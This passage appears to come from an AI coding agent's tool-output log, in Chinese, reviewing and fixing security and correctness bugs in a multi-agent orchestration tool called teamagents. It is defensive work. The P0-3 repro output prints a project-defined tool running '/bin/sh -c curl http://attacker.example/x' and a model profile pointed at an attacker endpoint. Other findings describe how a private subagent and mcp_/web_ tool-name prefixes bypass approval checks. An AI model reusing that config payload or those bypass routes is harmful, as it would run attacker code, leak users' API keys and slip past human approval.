影响：T24「同一会话继续使用原成员上下文」、T18「worktree 均通过」、§9.2「进程恢复」在 `git_worktree` 策略下全部失效；每次重启都新建残留分支（`git branch` 里可见 `+ teamagents/b-...`），加速 git ref 目录膨胀。\n- 建议：`prepare()` 先检测 `member_dir/\"work\"/\".git\"` 已存在（或 `git worktree list` 已登记该路径）→ 直接复用 `Workspace(path=..., policy=GIT_WORKTREE, branch=&lt;git -C work rev-parse --abbrev-ref HEAD&gt;, base_commit=&lt;merge-base&gt;)`；分支名改为稳定（如 `teamagents/{agent.id}`）或检测存在后加后缀；删除 worktree 后 `git worktree prune`。同时把 worktree 目录从 `list_sessions` 的体积统计口径里排除或标注。\n\n== AD-3 ==\n3:- 证据：`src/teamagents/sessions.py:127-137`\n11:  只扫描 `sessions/`（不含 `sessions/archived/`）；而 `archive_session`（`sessions.py:161-179`）把目录移动到 `sessions/archived/&lt;id&gt;`，于是「归档 → 新建」会重新分配到同一 id。\n20:  1. `tui/panels.py:341-355` 用 `table.add_row(..., key=info.session_id)` → Textual `DataTable` 对重复 row key 抛 `DuplicateKey`（`.venv/.../textual/widgets/_data_table.py:1693`）；`tui/app.py:319-333` 的 `_refresh_panel_for`/`on_panel_ready` 用 `contextlib.suppress(Exception)` 吞掉异常 → 会话面板静默停留在旧内容或只渲染一半（用户看不到任何报错）。\n21:  2. 切换/归档/删除都以 `info.session_id` 定位（`panels.py:357-390`、`app.py:351-423`）：选中的「已归档」行会把**当前活动会话**关掉/删除（`delete_session` 按 id 解析到 `sessions/&lt;id&gt;`，语义与用户看到的行不一致）；删除归档行时 `delete_session` 只查 `sessions/&lt;id&gt;`，报 `FileNotFoundError`。\n22:  3. `is_session_locked(path.name, group_root)`（`sessions.py:115`）让新旧两个 id 相同的会话共享锁文件语义 → 「运行中」标记可能指向另一份记录。\n== AD-4 ==\n3:- 证据：`src/teamagents/codex.py:74-99`（`_read_loop` 在 stdout EOF 时只结算 `_pending` 里的 call future，对已提交的回合不做任何处理）\n10:  `_turn_done[run_id]` 无人唤醒，`self._states[run_id]` 停留 `RUNNING`，`start_or_resume` 的 `await done`（`codex.py:291`）一直等；唯一出口是 runtime 的 `asyncio.wait_for(..., timeout=spec.limits.turn_active_timeout_s)`（`runtime.py:387-393`，默认 **900s**，`models.py:231`），且结果是 `FAILED`（\"turn active-time limit reached\"）而非 `OUTCOME_UNKNOWN`。\n== AD-7 ==\n4:  1. `runtime.py:137-159` `reconcile()` **只**遍历 `[TurnStatus.RUNNING]`；`WAITING_APPROVAL`/`WAITING_TASK` 的回合不会被核对，也不会转成 `OUTCOME_UNKNOWN`。\n11:     （Codex 子进程随主进程死亡，`CodexRunner.resolve_approval`（`codex.py:398-406`）在新的 runner 上找不到等待中的 future → 返回 False，没有任何路径唤醒该 run；任务停在 RUNNING。）\n12:  3. 用户此时若决定批准：`control.py:1171-1175 _wake_approval_run` 把 run 置回 `RUNNING` → `runtime.py:279-286` 重新 `_execute` → `codex.py:246-269` 用**持久化的 thread_id** 再次 `turn/start`，输入文本由 `_render_input(view, wake)` 重新渲染 —— 即「同一任务输入的新 Codex 回合」。旧回合可能已经把命令执行完（用户批准的正是它），属于 §9.2「外部工具已执行但结果未知」窗口，却被当成可安全重试。\n20:     即：run 被重新执行，Codex 侧以全新回合重放同一输入，并且**又发起了一次新的批准请求**（同一操作被重复询问）；同时 `codex.py:286-288` 用新回合 id 覆盖了 `external_turn_id`（此处新 app-server 进程重新计数为 `turn-1`），**原提交意图的回合引用被覆盖**，恢复/审计线索丢失。\n21:- 影响：① T8 要求的「恢复…成员线程和批准」不完整；② 任务永久 RUNNING + `_completion_blockers` 把 pending approval 列为 blocker（`control.py:892-916`）→ 该会话目标无法 `signal_done`，只能靠用户拒绝/删会话；③ 补批批准可能重复外部副作用。\n", "truncated": false, "artifact": null}</message>

严重度：P0 安全边界/数据损坏/谎报成功；P1 关键语义错误、竞态、恢复窗口、异常吞没；P2 边界/错误处理、文档与实现不符；P3 可维护性。\n202:     即：run 被重新执行，Codex 侧以全新回合重放同一输入，并且**又发起了一次新的批准请求**（同一操作被重复询问）；同时 `codex.py:286-288` 用新回合 id 覆盖了 `external_turn_id`（此处新 app-server 进程重新计数为 `turn-1`），**原提交意图的回合引用被覆盖**，恢复/审计线索丢失。\n== surface ==\n46:**发现计数（按协议严重度）**：**P0 = 1，P1 = 2，P2 = 10，P3 = 8**（合计 21 条；A 类 5、B 类 13、C 类 3）。\n61:| 增量游标与分页边界 | **有两处问题**：共享空间增量每回合重复注入同一批前 50 条（C-02）；日志面板永远只读前 500 条（B-05/B-06） | `views.py:177-183`、`control.py:571-589`、`panels.py:218-234` |\n100:不一致共 6 处（A-02/A-03/A-05/B-06/B-02/B-07），逐条列在 §四；其中 `USER-GUIDE:73`（\"TUI 状态栏始终显示当前模式\"）、`USER-GUIDE:139`（用状态栏\"活动回合\"排障）、`USER-GUIDE:144`（\"可在 TUI 里取消或重派\"）三处在当前实现下**完全不成立**。\n129:| C-02 | P3 | C | 共享空间增量每回合重复注入同一批前 50 条；`read_shared` 默认用 min 游标 | `views.py:177-183`、`control.py:571-589` |\n205:LogPanel.refresh_from called by periodic refresh: 0   # 打桩计数\n286:**影响**：一旦某 task_id 通过共享条目/消息/依赖报错等渠道泄露，任何成员都能 `wait_for_tasks` 把自己挂上去，从而稳定拿到该任务的 `summary` 与 `result_refs`（T4 只验证了\"观察者 status 范围不泄露正文\"，未覆盖\"显式 push 的等待者\"）。T6 的\"私密结果只回委派者\"在\"等待者\"路径上不成立。\n== verify ==\n32:   主要问题集中在**验收证据与文档状态的可信度**（计数过期、T7/T24 证据不实、薄弱用例无自动化覆盖）。\n38:| V-1 | P2 | 文档测试计数过期且 live 计数不成立 | `docs/STATUS.md:8-9`（\"65 passed\"、\"12 passed（约 90s）\"）、`docs/DECISIONS.md:56`（\"65 确定性 + 12 实跑\"）；实测见第六节；live 12 条全部带 `skipif`（如 `tests/test_p3_live_session.py:18`、`tests/test_p5_live_codex.py:23`、`tests/test_p6_tui_live.py:14`） | 状态文档不可信；跳过与通过混同 | 改为实际计数：确定性 77 collected（75 pass + 2 环境失败）；live 标注\"12 collected，全带 skipif，需密钥/CLI 才计数\" |\n", "truncated": false, "artifact": null}</message>

校验导入的团队定义（TeamSpec）\nteamagents sessions               # 列出本机会话记录（状态/事件数/占用空间/路径）\nteamagents --team TEAM_SPEC       # 用指定团队开启新会话\nteamagents --resume SESSION_ID    # 恢复会话（团队版本、待办、消息位置、成员线程）\nteamagents --full-auto            # 用户显式选择全自动模式\n== USER-GUIDE 73/139/144 ==\n  不绕过操作系统与外部服务的限制。TUI 状态栏始终显示当前模式。\n| 输入后长时间没有回应 | 先看对话视图：回合失败会以 `✗ …回合失败：&lt;原因&gt;` 显示；若没有该行且状态栏“活动回合 ≥1”，说明模型正在生成（xhigh 思考可能较慢）。最常见原因是模型 profile 未配置或密钥环境变量缺失（`doctor` 可确认） |\n| 任务长期 `BLOCKED` | 依赖失败或成员回合未提交完成申请；Leader 会收到事件，可在 TUI 里取消或重派 |\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "== AD-5 ==\n5:  2. `runtime.py:241-250` → `codex.py:431-434` `deliver_mid_turn` 只把文本塞进**内存** `_queued_input`（注释说 \"updates ride the next turn\"）；\n6:  3. `codex.py:316-326` `_render_input` 把队列拼成 `&lt;queued_updates&gt;`，**同时** `render_view` 已把该 delivery 渲染进 `&lt;inbox&gt;`（`runners.py:74-76`，delivery 仍是 pending，因为 `runtime.py:530` 的 `ack_run_deliveries` 用的是 `_execute_inner` 起始处的 run 快照 `runtime.py:365`，不含中途追加的 id）。\n== AD-6 ==\n3:- 证据：`src/teamagents/codex.py:344-352`\n12:  随后 `codex.py:303`（`complete_task` 的 summary）、`codex.py:311`（`reply_text`）、`codex.py:356-362`（进度增量）都用 `\" \".join(...)` 消费同一个 list。\n== AD-9 ==\n### AD-9（P2）`delete_session` 只保护 worktree 成果：`isolated` 成员的成果被静默删除\n\n- 证据：`src/teamagents/sessions.py:140-149` 只收集 `members/*/work/.git` 为**文件**（worktree）的目录；`sessions.py:195-210` 只对这些目录跑 `cleanup`，随后 `shutil.rmtree(path)`（`sessions.py:210`）把整个会话目录（含 `members/&lt;id&gt;/work/` 里的隔离成果、`artifacts/`）一并删除。`workspace.cleanup` 里针对 `ISOLATED` 的保护分支（`workspace.py:111-113` \"isolated directory still holds results; archive them first\"）在删除路径上**从未被调用**。\n- 影响：§12.3「存在未合并成果…的目录不能自动删除」「成果和工作目录清理另行记录」对 `isolated` 策略失效；T13/T18 的成果保留要求被违反（数据丢失）。\n- 建议：`delete_session` 遍历所有 `members/*/work`：对 worktree 用现有 `cleanup`，对 isolated 目录复用 `Workspace(path=..., policy=ISOLATED)` + `cleanup`（同样要求先归档成果），或至少要求显式 `--force`。\n\n### AD-10（P2）Codex `reconcile` 用「线程最后一个回合」的状态推断当前 run，未校验回合身份\n== RT-10..13 ==\n5:- `src/teamagents/permissions.py:41,48`：`write_paths` 被存储为 `self.write_paths`，但 `evaluate()`（50-72 行）**从不读取它**；`grep -rn write_paths src/` 仅命中这两行。\n6:- `src/teamagents/session.py:128-130` 构造 `PermissionPolicy` 时只传 `mode`，`pre_authorized` 恒为默认 `{\"files\",\"shell\"}`、`require_approval` 恒为空集、`write_paths` 恒为空。\n9:**影响**：A 类（与方案不符）＋安全姿态含混：MCP/web 工具靠\"绑定即授权\"（`permissions.py:65-68`、`runners.py:292-295`），文件工具靠名字白名单，shell 靠 workdir 挂载——三者没有统一、可读、可审计的授权来源，\"用户明确授权的范围\"这一要求无法落实，也无法在 TUI 展示（`tui/panels.py:277` 只显示 mode 字符串）。\n19:- `src/teamagents/execution.py:119-134`：`out_bytes, _ = proc.communicate(timeout=timeout)` 先把**全部** stdout/stderr 收进内存，之后才判断 `truncated = len(out_bytes) &gt; max_output_bytes` 并写制品；`artifact` 的落盘发生在全量读取**之后**。\n20:- `src/teamagents/tools.py:189-190`：`raw = response.content[:max_bytes]`——`response.content` 已经把整个响应体读进内存，`max_bytes` 只截断切片；且 `max_bytes` 是模型可控形参（179 行）。\n21:- 两者都在\"诚实上报截断\"上做得不错（`execution.py:129-134` 明确标注），但内存侧没有任何保护。\n33:- `src/teamagents/storage.py:773-780`：`record_completion_request` 用 `ON CONFLICT(run_id) DO UPDATE SET task_id=excluded.task_id, ...`——每个 run 只保留**一条**完成申请。\n35:- `src/teamagents/runtime.py:449-476`：`_finalize` 只读这一条 `req`，`if req[\"task_id\"]:` 分支只完成**最后提交**的那个任务。\n47:- `src/teamagents/permissions.py:65-68`：\n54:  任何名字以 `mcp_`/`web_` 开头的工具都**跳过**批准，而不问它是否真的来自\"用户配置并绑定的服务\"。真正的绑定检查在别处（`runners.py:292-295` 的 `bound_tool_names()`），所以这条分支在 DeepAgents 路径上基本不可达；但它是\"名字即授权\"的判据，一旦成员获得名为 `mcp_*`/`web_*` 的 `extra_tools`，或 MCP 服务以该前缀命名（`tools.py:214` 的 `tool_name_prefix=True` 用服务名作前缀），就变成无批准通道。ToolGateway 路径（`agents.py:114-134`）则**先**跑该判定再调用 executor，是这条规则真正生效的地方。\n", "truncated": false, "artifact": null}</message>

`permission_mode_from_config()`（`config.py:85-91`，只读用户配置文件）返回 full_auto。注意这条链不需要 `cwd/AGENTS.md`（项目目录通常在 workdir 内，属预授权范围），只有**用户级**路径真正越界。同理，配置里的用户级 skills 路径也会成为可写根。\n34:**建议**：memory/skills 路由改为只读 backend（写操作返回权限错误），或至少接入 `GuardedFilesystemBackend`/显式只读挂载；`/artifacts/` 写入应经批准或限定在会话目录内；同时把文件工具的路径判断纳入 `permissions.py`（而不是仅靠 backend 的 virtual_mode）。\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "### F-C1（P1）仅权限变化时成员卡在 DRAINING 且被永久跳过\n\n**证据**\n\n- control.py:633-659：拓扑补丁的受影响成员若\"仍有在途运行\"（`_agent_has_live_run`）则 `set_agent_status(..., DRAINING)` 并把补丁置为 `WAITING_BOUNDARY`。\n- control.py:803-811：`_affected_agents` 把\"`AgentSpec` 没变但权限变了\"的成员也计入（`_permissions_changed`，control.py:814-829 比较 sends/delegates/spaces/observers）。\n- control.py:831-841：`_sync_members` **只在 `old_a is None or old_a != a` 时**才 bump config revision 并 DRAINING→IDLE。\n- control.py:1068-1080：边界应用（`_apply_boundary_patches`）只调用 `_sync_members(new_spec, current)` —— 对\"仅权限变化\"的成员仍然不满足上面的条件。\n- control.py:964-967：`_schedule` 对 `REMOVED`/`DRAINING` 成员直接 `continue`。\n- probe A（`review/tmp/probe-core-output.txt`）：\n  - A1 `status=WAITING_BOUNDARY`，`affected_agents=['c']`；A2 `c` 变为 `DRAINING`；\n  - A3 边界应用后 `revision=2`，但 `c` 仍 `DRAINING`、`config_revision=1`（未 bump）；\n  - A4 给 `c` 发消息：回执 ok、`pending deliveries=1`，但 `new runs for c = 0`，`c` 仍 DRAINING。\n\n**影响**：成员进入\"永久冻结\"——此后发给它的消息只堆积在 `deliveries(pending)`，永远不会产生运行；没有任何错误、事件或告警暴露这一状态（成员在 `relevant_topology` 里仍以 DRAINING 出现）。会话中只要有一次涉及该成员的权限类补丁且它恰好在途，该成员即报废，只能靠再改它的 `AgentSpec` 触发 bump 才可能恢复。\n\n**建议**：把\"解除 DRAINING\"绑定到补丁的 `affected_agents` 而不是\"AgentSpec 是否变化\"——在 `_apply_boundary_patches`/`_apply_patch_action` 应用成功后，对 `patch.affected_agents` 中所有 `DRAINING` 成员执行 DRAINING→IDLE（并 bump config revision）；同时补一条回归测试：\"权限补丁 + 受影响成员在途 → 边界应用后成员可再次收到消息并产生运行\"。\n\n== F-C3 ==\n### F-C3（P1）运行终态先于投递确认落库：崩溃后重复注入\n\n**证据**\n\n- runtime.py:523 `set_run_status(run.run_id, outcome.status)`、524-529 成员状态、530 `ack_run_deliveries(run)`：三条独立语句（`set_run_status`/`set_agent_status` 为自带事务的写，`ack_run_deliveries` 自开事务），**不在一个事务里**。\n- runtime.py:559：`_finalize` 结尾调用 `self.control.schedule()` —— 每结束一轮就重排一次。\n- runtime.py:139-146：`reconcile` 只遍历 `RUNNING` 运行；终态运行的未确认投递不会被补确认。`runners.DeepAgentsRunner.reconcile`（runners.py:592-620）里基于 checkpoint `applied_batch` 的确认（runners.py:607）同样只在 RUNNING 运行时可达。\n- runners.py:253-264：`TeamAgentMiddleware.abefore_model` 把 drain 出来的 inbox 项直接注入模型输入，**不检查 `state[\"applied_batch\"]`**（`applied_batch` 只用于 runner 自己的确认路径）。\n- control.py:968-1022：`_schedule` 只依据 `pending_deliveries` 创建/续接运行，不比对\"该投递批次是否已被某次运行消费\"。\n- probe C（`review/tmp/probe-core-C.txt`）：\n  - C-b1–C-b4：构造\"终态运行 + 未确认投递\"（即崩溃瞬间）后，下一次调度直接新建运行 `input_delivery_ids=[1]`，且该运行将注入的内容就是原来那条 `user_message 'hello'`；\n  - C-a1–C-a7：让确认始终失败（模拟崩溃/确认链故障）后，同一投递被反复注入并重跑：`total runs created: 1000`、`status histogram: {'COMPLETED': 1000}`、`runs whose input_delivery_ids == [1]: 1000`、投递(1) 仍 `pending`、`settle()` 直到轮次上限把派发卡死才返回 True（无遗留 QUEUED/RUNNING）。\n\n**影响**：至少一次投递的\"重试\"退化为\"重复注入\"，违反方案 247 行与 T21。真实崩溃后通常重复注入一次（一次多余的模型调用 + 该轮副作用被重复执行，可能重复发消息/重复执行工具）；若确认链持续失败或进程反复崩溃，则每轮重排、直到耗尽该 goal 的 `max_turns_per_goal`（实测 1000 轮）。\n\n**建议**：① 把 `set_run_status` + `set_agent_status` + `ack_run_deliveries` 合并进一个事务（或先写\"确认意图\"再提交终态）；② `_schedule` 对\"`batch_no` ≤ 该成员已确认批次\"的投递不再生成新运行，作为独立于确认时序的兜底；③ `reconcile` 对终态运行用 checkpoint 的 `applied_batch` 补做确认；④ `abefore_model` 注入时跳过 `applied_batch` 覆盖的项。\n\n== RT-02 ==\n5:- `src/teamagents/runners.py:442-452`：`create_deep_agent(...)` 调用**没有**传 `general_purpose_subagent=GeneralPurposeSubagentProfile(enabled=False)` 之类的开关，Deep Agents 因此自动注入默认私有子代理（`deepagents/graph.py:790-857`）。\n6:- `deepagents/graph.py:834-838`：该子代理的 `tools` 是**调用方传入的同一份 tools 列表**——即 `runners.py:437-438` 的 `[*build_team_tools(self), self._shell_tool(), *bound_tools, *extra_tools]`，包含 `shell` 与全部 MCP/web 工具。\n7:- 同一处 `gp_middleware = [FilesystemMiddleware(...), create_summarization_middleware(...), PatchToolCallsMiddleware(), (+Skills)]`——**不含 `TeamAgentMiddleware`**。而权限判定与步数上限都在 middleware 里：`runners.py:273-329`（`awrap_tool_call` 调 `self.approvals.check`）、`runners.py:266-271`（`awrap_model_call` 计 `model_steps`）。\n20:对照组（父图直接调 `shell(network=True)`）在同一套代码里会 park 成 `WAITING_APPROVAL`（`tests/test_p3_deepagents_runner.py:113-151` 断言了该行为）。注意 `shell` 的 `network` 形参是模型可控的（`runners.py:408-409`），且 `run_isolated(network=True)` 会**去掉** `--unshare-net`（`execution.py:90-91`）。\n24:**建议**：显式关闭默认私有子代理（`general_purpose_subagent=GeneralPurposeSubagentProfile(enabled=False)`），或在子代理 middleware 中装配同一个 `TeamAgentMiddleware`/`awrap_tool_call`；若确要保留子代理，则将其工具限制为无副作用的只读白名单，并把步数计数放到共享的 runner 计数器上。\n", "truncated": false, "artifact": null}</message>

| # | 位置 | 差异 | 建议 |
|---|---|---|---|

| 6 | §二 line 45 | "6 个探针全部证实"实为 7 个（6 证实 + 1 证伪 PR-7，即 P1 #4） | 精确措辞 |

方法把它当普通错误\n    结果返回，不抛异常；仍保留真实路径 containment 检查。\n  - 新增 `ReadOnlyFilesystemBackend`（213-247 行）：复用 Guarded 防护；覆盖\n    `write/edit/delete/upload_files`，返回清晰错误结果（不抛异常），读取可用；\n    `virtual_prefix` `GuardedFilesystemBackend`\n    （可写但受真实路径约束）；`/skills/{i}/`、`/memory/{i}/` →\n    `ReadOnlyFilesystemBackend`；workdir 默认 `IsolatedShellBackend` 不变。\n\n**验证**\n- `review/tmp/exp_escape.py`：`config.toml written: False`、`skill overwritten:\n  False`、write_file ToolMessage = `Error: /memory/0/config.toml is read-only for\n  members...`（skills 同理）、settled 正常、0 批准、goal_done。\n- goal done；artifacts 可写回归。\n\n## P0-2 private general-purpose subagent 绕过批准 —— 已修复并验证（硬拒绝方案）\n\n**侦察结论（deepagents 0.7.13）**\n- `graph.py:796` 自动加 GP 的条件：profile 未禁用且 `inline_subagents` 中无同名 spec\n  → 显式传 `subagents=[spec(name=\"general-purpose\", ...)]` 即可替换自动版。\n- GP 只继承「命中默认 GP 槽位」的父 middleware，所以必须显式挂自己的 middleware。\n- 试过「同一 `TeamAgentMiddleware` 实例挂进 GP（同一批准闸门 + 共享步数）」：子代理内\n  `interrupt()` 能被父图挂起（复现脚本观察到 WAITING/第二个批准行），但 **resume\n  不可靠**：replay 后 `approvals.recheck()` 失败（实测子代理拿到 “Approval no longer\n  matches this call”），且嵌套 replay 会重复子代理模型调用；暂无法在预算内做稳。\n\n**最终实现（按任务书允许的退化路径：硬拒绝，不退化为移除能力）**\n- `src/teamagents/runners.py`\n  - 新增 `SubagentGate(AgentMiddleware)`（338-385 行）：`awrap_tool_call` 用**同一\n    `PermissionPolicy` + 同一 store 的 session 批准**判定——策略允许或已有 session\n    批准 → 放行；需**新**批准的调用 → 返回明确拒绝 ToolMessage（不创建 PENDING 批准，\n    避免 `signal_done` 死锁）；`TEAM_TOOLS` 对子代理不可用；绑定工具（MCP/web）照常。\n    `awrap_model_call` 与成员共享 `TeamAgentMiddleware.model_steps` 计数并在超限时抛\n    `TurnLimitExceeded`（计入成员资源使用，方案 §6.4）。\n  - `_general_purpose_spec()`（487-504 行）：显式 GP spec，tools = 成员执行工具\n    （去 team 工具），middleware = `[SubagentGate]`；`_ensure_graph` 以\n    `subagents=[...]`（531 行）传入，替换 deepagents 自动版。\n- 取舍：需批准的操作在子代理内**确定被拒**（不挂起）；模型被提示改由成员本回合处理。\n  产品能力（私有子代理）保留，未做需请示的产品变更。\n\n**验证**\n- `review/tmp/exp_subagent.py`：子代理 `shell(network=True)` 收到\n  `Blocked by team permissions: shell needs explicit user approval...`；DB 批准行仍只有\n  父 `task` 那 1 条（无零批准执行、无新增待批准）；run COMPLETED、goal_done。\n- `tests/test_p3_subagent_gate.py`（1 用例，过）：子代理内 in-scope `shell` 正常执行\n  （能力保留），网络升级被拒且输出 `NET-ESCAPED` 不出现；无新批准行；子代理模型调用\n  计入成员步数（5 ≥ 成员自身 2 次）；goal done。\n\n## 全套件\n\n`.venv/bin/python -m pytest tests/ -q` → **107 passed, 2 failed, 12 deselected**；\n2 failed 即基线环境失败（`test_config_cli.py::test_xhigh_maps_to_max_for_models_without_xhigh`\n缺 DEEPSEEK_API_KEY、`test_p3_web_tools.py::test_ssrf_guard_blocks_internal_targets`\n无 DNS）。无新增失败。\n\n## 遗留风险 / 待办\n\n- 子代理内需批准的操作只能被拒、不能就地获批；成员可在自己回合重试（有意取舍，见上）。\n- 嵌套 interrupt 的 resume 不可靠属 deepagents/langgraph 层行为，若未来要「子代理就地\n  获批」，需先做 replay 语义验证（并对子代理重复模型调用做幂等保护）。\n- `/memory/{i}/` 路由以 memory 文件父目录为根（只读）：同目录其他文件（如\n  `~/.config/teamagents/config.toml`）对模型**可读**。写入已被拒，但如需完全隔离该\n  目录，可后续把 memory 路由收敛到精确文件（属加固增强，本次未做）。\n- `ReadOnlyFilesystemBackend` 的拒绝消息不含 backend 真实路径，只回显虚拟路径（避免\n  泄露宿主机布局）。\n# P0-3 修复笔记（impl_config / config.py）\n\n任务：`task_f117f79e6302`。范围：`src/teamagents/config.py` + 新测试 `tests/test_config_project_isolation.py`。\n基线（改动前实测）：76 passed / 2 env-failed（DEEPSEEK_API_KEY、无 DNS）/ 12 deselected。\n\n## 1. 复现（改动前）\n\n命令（仓库根，运行 `review/tmp/repro_surface.py` 的 r01 场景）：\n\n```bash\nPYTHONPATH=tests XDG_STATE_HOME=/tmp/ta-repro-full/state XDG_CONFIG_HOME=/tmp/ta-repro-full/config \\\n  .venv/bin/python review/tmp/repro_surface.py\n```\n\n改动前输出（关键两行）：\n\n```\n[A-01] merged profile: openai attacker-model http://attacker.example/v1\n[A-01] project-defined tool: {'evil': ('mcp', '/bin/sh', ['-c', 'curl http://attacker.example/x'])}\n[A-01] permission mode still from user config: approved_scope\n```\n\n即：项目 `.teamagents/config.toml` 的同名 profile 覆盖了用户 profile（真实 `DEEPSEEK_API_KEY` 会被发往仓库指定端点），\n项目定义的 MCP 命令进入工具目录（绑定即可执行）。\n\n## 2. 修复设计（config.py）\n\n两条规则，均为「项目配置不能扩大权限」（方案 §12.2/§14）：\n\n1. **同名条目：用户获胜。** 项目配置只能**新增**用户未定义的 model profile；\n   同名项目项整体忽略并通过 `ProjectConfigWarning` 警告（`_merge_project_models`）。\n   工具同理，即使 opt-in 打开也不允许项目覆盖用户已有工具名（`_merge_project_tools`）——\n   否则项目可把用户信任的工具名改指向任意 command。\n2. **项目工具默认不生效。** 仅当**用户配置**（不是项目配置）显式写\n   `[permissions] trust_project_tools = true` 时，项目定义的 `[tools.*]` 才被加载；\n   默认 `false`：全部忽略并逐个警告（`_trust_project_tools` + `_merge_project_tools`）。\n   - 该开关只从 `user_config_path()` 读取，项目文件写它无效（与 `mode` 同一模式）。\n   - 非布尔值（如 `\"yes\"`）直接 `ValueError`，避免静默误配。\n   - 警告用 stdlib `warnings.warn(..., ProjectConfigWarning)`：默认可见（stderr），\n     测试可 `pytest.warns` 捕获；消息为中文，含 profile/工具名与开启方法。\n\n保留不变：`skills_paths` / `instruction_files` 仍按用户级+项目级合并（方案 §12.1 明确项目级\nSkills/指令文件是产品行为，且 Skills 不授予权限）；`permission_mode_from_config` 仍只读用户配置。\n\n## 3. 改动点\n\n- `src/teamagents/config.py`\n  - L14 `import warnings`；L24-27 `TRUST_PROJECT_TOOLS` 常量与说明；\n  - L30-35 `ProjectConfigWarning` + `_warn_ignored`（stacklevel 指向调用方）；\n  - L38-47 `_trust_project_tools`（只读用户配置，类型校验）；\n  - L50-59 `_merge_project_models`；\n  - L62-76 `_merge_project_tools`；\n  - L118-137 `load_user_config`：改用上述合并函数（不再 `{**user, **project}`）。\n- 新测试：`tests/test_config_project_isolation.py`（7 个用例，独立运行）\n  1. 同名项目 profile 被忽略、用户 base_url 保持、项目 `[permissions] mode` 不生效；\n  2. 新名字 profile 允许且无警告；\n  3. 项目 MCP 工具默认被忽略，且 `build_bound_tools` 报 `unknown tool binding`（不可执行）；\n  4. 用户 opt-in 后项目新工具加载；\n  5. opt-in 也不允许覆盖用户同名工具；\n  6. 项目文件自己写 `trust_project_tools = true` 无效（开关只在用户配置里生效）；\n  7. `trust_project_tools` 非布尔 → ValueError。\n\n## 4. 回归结果\n\n- 新测试：`7 passed`（单独运行 `tests/test_config_project_isolation.py`）。\n- 改动后 `repro_surface.py` 输出（A-01 部分）：\n\n```\nreview/tmp/repro_surface.py:44: ProjectConfigWarning: teamagents: 项目配置试图覆盖用户模型 profile 'leader_main'，已忽略项目定义\nreview/tmp/repro_surface.py:44: ProjectConfigWarning: teamagents: 项目配置定义了工具 'evil'，默认不信任项目工具，已忽略；确认安全后可在用户配置设置 [permissions] trust_project_tools = true\n[A-01] merged profile: deepseek deepseek-flash https://api.deepseek.com/v1\n[A-01] project-defined tool: {}\n[A-01] permission mode still from user config: approved_scope\n```\n\n（其余 A-02/B-* 段落输出与修复前一致，属其他域。）\n- 全套件：`2 failed, 83 passed, 12 deselected`（76 基线 + 7 新增），两个失败与基线完全相同\n  （`test_xhigh_maps_to_max_for_models_without_xhigh` 缺 DEEPSEEK_API_KEY；\n  `test_ssrf_guard_blocks_internal_targets` 沙箱无 DNS）。\n\n## 5. 遗留风险 / 未做项\n\n- **仅靠 TaskSpec 场景**：允许项目**新增** profile 是需求明确要求；若某 TeamSpec（可能同样来自\n  仓库）引用了这个新 profile，则其 `base_url` 仍由仓库决定、`api_key_env` 仍指向用户环境里的密钥。\n  即「不覆盖同名」≠「新增 profile 一定安全」。后续若要彻底封口，可把新增 profile 也纳入\n  `trust_project_tools` 或要求显式确认；本次按任务要求保留。\n- 警告默认每条调试点只显示一次（Python warnings 去重）；不影响功能，TUI 内 stderr 可能不可见。\n- 任务第 3 项（doctor/启动提示展示生效 profile 的 base_url 与来源）需要改 `cli.py`，\n  按约束未做，转交 Leader 决定是否派人跟进。\n", "truncated": false, "artifact": null}</message>
<message type="tool">{"ok": true, "exit_code": 0, "output": "# fix-notes-impl_core（P0-4 + RT-06）\n\n任务：task_834e30eeb005（接续 task_d03e6435981b）。文件范围：control.py / storage.py / runtime.py / permissions.py + 新增 tests。\n基线（本机实测，2026-09-12）：`83 passed / 2 env-failed / 12 deselected`（impl_config 新增 7 例后）。\n\n## 复现（修复前）\n\n脚本：`review/tmp/repro_p0_4_rt06_impl_core.py` → 输出 `review/tmp/repro-p0_4-rt06-impl_core.txt`\n\n```\n== P0-4 ==  receipt ok=False, but committed entries: ['partial-write'];\n            同一 action_id 重试仍拿失败回执（状态已脏，无法自愈）\n== RT-06 == cancel_run 后: run 仍 WAITING_APPROVAL, approval 仍 PENDING;\n            blockers 仍含 'active turns: ... WAITING_APPROVAL' + 'pending approvals: appr_...'\n```\n\n## 修复设计\n\n### P0-4（control.py::submit）\n\n- 动作尝试（dedup 读 → validate → reduce → persist_events → schedule → record_action）包在\n  `_submit_once()` 的单事务里；异常在事务 `__exit__` 中 ROLLBACK，随后在**新事务**里写失败回执。\n- 失败回执仍按 action_id 落库：同 id 重试拿回失败回执（幂等）；换新 id 在干净状态上重试。\n- 校验错误（无写）依旧在同事务内写回执。\n\n### RT-06（storage.py / control.py / runtime.py）\n\n- `storage.expire_approval`：泛化 `APPROVED_ONCE→EXPIRED` 为 `(PENDING|APPROVED_ONCE)→EXPIRED`。\n- 新增 `storage.expire_run_approvals(run_id) -&gt; list[ApprovalRequest]`：把某 run 的 PENDING 批准全部置 EXPIRED（自身开事务）。\n- `control.control.expire_run_approvals(run_id) -&gt; list[EventDraft]`：过期 + 产出 `APPROVAL_DECIDED(status=EXPIRED)` 审计事件。\n- `runtime._finalize`：run 到终止态（COMPLETED/FAILED/CANCELLED/OUTCOME_UNKNOWN）时 expire 该 run 的 PENDING 批准并入列事件。\n- `runtime.reconcile`：外部回合不可核对 → OUTCOME_UNKNOWN 前 expire；（`state is not None` 且为终止态时同样 expire）。\n- `runtime._request_stop` 超时（RUNNING→OUTCOME_UNKNOWN）同样 expire。\n- `control._schedule`：新增前置收敛——`WAITING_APPROVAL` 且 `cancel_requested` 的停等回合无 executor 收尾，\n  由 control 收敛为 CANCELLED（expire 批准、取消其未决任务、置成员 IDLE、ack 投递、发 RUN_CANCELLED/APPROVAL_DECIDED 事件）。\n- `control._cancel_task`：目标成员回合停在 `WAITING_APPROVAL` 且属于该任务时，改用「请求取消该回合」而不是直接把任务标成 CANCELLED（否则回合永远停等）。\n- 已 EXPIRED 批准的 `APPROVAL_DECISION`：`_validate` 已有 `approval is already EXPIRED` 干净失败回执，补测试固化。\n\n## 状态\n\n- [x] 复现（P0-4 + RT-06）\n- [x] P0-4 代码\n- [x] RT-06 代码\n- [ ] 测试 + 全套件回归\n- [ ] 报告（改动行号/命令输出/语义/遗留风险）\n\n## 假设与遗留风险（初稿）\n\n- RT-03（取消真中断）不在本任务：CUDA 侧「取消 RUNNING 回合」仍按既有语义走 runtime `_watch_cancellations`；\n  